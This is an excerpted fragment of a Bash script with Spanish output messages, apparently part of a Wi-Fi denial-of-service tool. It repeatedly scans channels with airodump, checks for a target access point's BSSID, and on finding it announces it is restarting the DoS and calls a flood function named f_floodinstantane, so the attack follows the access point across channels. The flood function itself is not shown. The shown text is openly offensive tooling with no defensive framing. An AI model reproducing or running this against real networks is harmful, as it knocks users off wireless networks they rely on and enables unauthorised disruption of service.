...
f_floodinstantane
    ...
    echo -e "\e[1;31m [] El PA no está en el canal 1... Se sigue buscando...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi
...
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA está en el canal 11, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
...
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then  
   echo -e "\t\e[1;32m [+] El PA está en el canal 6, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en el canal 6... Se sigue buscando...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt*
fi
...
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then  
   echo -e "\t\e[1;32m [+] El PA está en el canal 13, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en el canal 13... Se sigue buscando...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi
...
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then  
   echo -e "\t\e[1;32m [+] El PA está en el canal 5, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
...
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA está en el canal 12, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
...
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA está en el canal 3, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
...
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA está en el canal 10, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
...
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA está en el canal 2, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
...
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then  
   echo -e "\t\e[1;32m [+] El PA está en el canal 8, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
